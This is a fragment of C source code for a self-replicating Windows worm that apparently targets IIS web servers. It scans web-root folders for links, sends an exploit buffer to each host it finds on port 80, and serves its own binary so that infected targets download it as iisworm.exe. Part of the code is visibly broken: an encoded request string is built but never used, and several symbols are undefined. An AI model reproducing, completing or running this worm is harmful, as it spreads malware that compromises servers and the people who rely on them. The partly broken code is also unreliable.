void attack(char *host) {
    SOCKET s;
    struct hostent *he;
    SOCKADDR_IN sout;
    int i;

    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) return;
    he = gethostbyname(host);
    if (!he) { closesocket(s); return; }

    memset(&sout, 0, sizeof(sout));
    sout.sin_family = AF_INET;
    sout.sin_addr.s_addr = *((unsigned long *)he->h_addr_list[0]);
    sout.sin_port = htons(80);

    i = connect(s, (LPSOCKADDR)&sout, sizeof(sout));
    if (i != 0) { closesocket(s); return; }

    send(s, sploit, sizeof(sploit), 0);
    closesocket(s);
}

void search(char *path) {
    WIN32_FIND_DATA wfd;
    HANDLE h, hf;
    unsigned long bytesread;
    char *b, *v, *m;
    DWORD s;

    if (!SetCurrentDirectory(path)) return;

    h = FindFirstFile("*.htm*", &wfd);
    if (h == INVALID_HANDLE_VALUE) return;

    do {
        hf = CreateFile(wfd.cFileName, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf == INVALID_HANDLE_VALUE) continue;

        s = GetFileSize(hf, NULL);
        if (s == INVALID_FILE_SIZE) { CloseHandle(hf); continue; }

        m = b = (char *)malloc(s + 1);
        if (!m) { CloseHandle(hf); continue; }

        if (!ReadFile(hf, b, s, &bytesread, NULL) || bytesread != s) {
            free(m);
            CloseHandle(hf);
            continue;
        }
        CloseHandle(hf);
        b[s] = 0;

        while (*b) {
            char *http = strstr(b, "http://");
            if (!http) break;
            v = http + 7;                   // skip "http://"
            b = strchr(v, '/');
            if (!b) break;
            *b = 0;                         // terminate at slash
            attack(v);
            b++;                            // move past the slash
        }
        free(m);
    } while (FindNextFile(h, &wfd));

    FindClose(h);
}

unsigned long __stdcall hunt(void *inr) {
    (void)inr;   // unused parameter
    search("\\wwwroot");
    search("\\www root");
    search("\\inetpub\\wwwroot");
    search("\\inetpub\\www root");
    search("\\webshare\\wwwroot");
    return 0;
}

void setuphostname() {
    char s[1024];
    struct hostent *he;

    if (gethostname(s, sizeof(s)) != 0) return;
    he = gethostbyname(s);
    if (!he) return;

    // Build the obfuscated string: hostname + "!GET /iisworm.exe"
    // then XOR with 0x21 (add 0x21)
    char tmp[1024];
    strncpy(tmp, he->h_name, sizeof(tmp) - 1);
    tmp[sizeof(tmp) - 1] = 0;
    strncat(tmp, "!GET /iisworm.exe", sizeof(tmp) - strlen(tmp) - 1);

    for (int i = 0; i < (int)strlen(tmp); i++)
        tmp[i] += 0x21;

    // Copy into sploit at offset where the original code expects it
    // Ensure we don't overflow (use a safe length)
    size_t copy_len = strlen(he->h_name);
    if (copy_len > 100) copy_len = 100;   // arbitrary safe limit
    memcpy(sploit + sizeof(sploit) - 102, he->h_name, copy_len);
}

int main(int argc, char **argv) {
    WORD wVersionRequested = MAKEWORD(1, 1);
    WSADATA wsaData;
    SOCKADDR_IN sin, sout;
    int soutsize = sizeof(sout);
    unsigned long threadid, bytesread;
    SOCKET s, in;
    HANDLE hf;

    // Load our own binary into memory (to be sent as payload)
    if (argc < 1) return 1;   // should never happen

    hf = CreateFile(argv[0], GENERIC_READ, FILE_SHARE_READ, NULL,
                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 1;

    sizemybytes = GetFileSize(hf, NULL);
    if (sizemybytes == INVALID_FILE_SIZE) { CloseHandle(hf); return 1; }

    mybytes = (char *)malloc(sizemybytes);
    if (!mybytes) { CloseHandle(hf); return 1; }

    if (!ReadFile(hf, mybytes, sizemybytes, &bytesread, NULL) || bytesread != sizemybytes) {
        free(mybytes);
        CloseHandle(hf);
        return 1;
    }
    CloseHandle(hf);

    if (WSAStartup(wVersionRequested, &wsaData) != 0) {
        free(mybytes);
        return 1;
    }

    setuphostname();

    // Start the hunting thread (ignores its parameter)
    CreateThread(NULL, 0, hunt, NULL, 0, &threadid);

    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) {
        WSACleanup();
        free(mybytes);
        return 1;
    }

    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = INADDR_ANY;
    sin.sin_port = htons(80);

    if (bind(s, (LPSOCKADDR)&sin, sizeof(sin)) != 0) {
        closesocket(s);
        WSACleanup();
        free(mybytes);
        return 1;
    }

    if (listen(s, 5) != 0) {
        closesocket(s);
        WSACleanup();
        free(mybytes);
        return 1;
    }

    while (1) {
        in = accept(s, (struct sockaddr *)&sout, &soutsize);
        if (in == INVALID_SOCKET) continue;
        CreateThread(NULL, 0, doweb, &in, 0, &threadid);
    }

    // Never reached
    closesocket(s);
    WSACleanup();
    free(mybytes);
    return 0;
}
